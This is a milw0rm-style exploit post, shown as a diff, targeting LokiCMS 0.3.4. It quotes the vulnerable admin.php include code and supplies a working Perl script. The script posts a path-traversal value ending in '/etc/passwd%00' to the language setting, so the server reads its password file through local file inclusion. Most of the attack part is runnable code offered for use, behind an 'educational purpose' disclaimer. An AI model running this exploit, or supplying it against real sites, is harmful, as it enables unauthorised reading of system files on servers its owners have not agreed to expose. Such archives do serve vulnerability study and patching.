@@ -1,0 +1,71 @@
+# LokiCMS 0.3.4 (admin.php) Create Local File Inclusion Exploit
+# url: http://www.lokicms.com/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# Greetz To: All Hackers and milw0rm website
+#
+# *Requirements: magic_quotes_gpc = Off
+
+-----------------------------------------------------------
+I had one idea when i saw http://milw0rm.com/exploits/6743
+I created the exploit that creates LFI.
+-----------------------------------------------------------
+
+vuln file: admin.php
+vuln code:
+
+		case 'A_SAVE_G_SETTINGS': //save main settings
+			writeconfig ( $c_password, $_POST['title'], $_POST['header'], $_POST['tagline'], $_POST
+['footnote'], $c_default, $_POST['theme'], $_POST['language'], $_POST['modrewrite'], $_POST['simplelink'], $_POST
+['code'] );
+  			$c_theme = $_POST['theme'];
+			include PATH . '/includes/Config.php';
+			include PATH . '/languages/' . $c_lang . '.lang.php'; --------> FUCKING THIS INCLUDE!!!!
+			$msg = $lang ['admin'] ['expressionSettingsSaved'];
+	         break;
+
+--------
+Exploit:
+--------
+
+use LWP::UserAgent;
+
+unless ($ARGV[0] && $ARGV[1])
+{
+    print "\n[x] LokiCMS 0.3.4 (admin.php) Create Local File Inclusion Exploit\n";
+    print "[x] written by JosS - sys-project[at]hotmail.com\n";
+    print "[x] usage: perl $0 [host] [path]\n";
+    print "[x] example: perl $0 localhost /lokicms/ \n\n";
+    exit(1);
+}
+
+my $lwp = new LWP::UserAgent or die;
+ 
+my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
+   $target .=  $ARGV[1] unless not defined $ARGV[1];
+   $target .= '/' unless $target =~ /^http:\/\/(.?)\/$/;
+
+my $res = $lwp->post($target.'admin.php', 
+                                [ 'LokiACTION' =>  'A_SAVE_G_SETTINGS',
+                                  'language'   =>  '../../../../../../../../../../etc/passwd%00']);
+
+if($res->is_error)
+{
+    print "[-] Exploit failed!\n";
+    exit ();
+}
+
+--------
+
+ENTERS ADMIN.PHP TO SEE /ETC/PASSWD
+
+Ingenious work :D
+
+# milw0rm.com [2008-10-13]
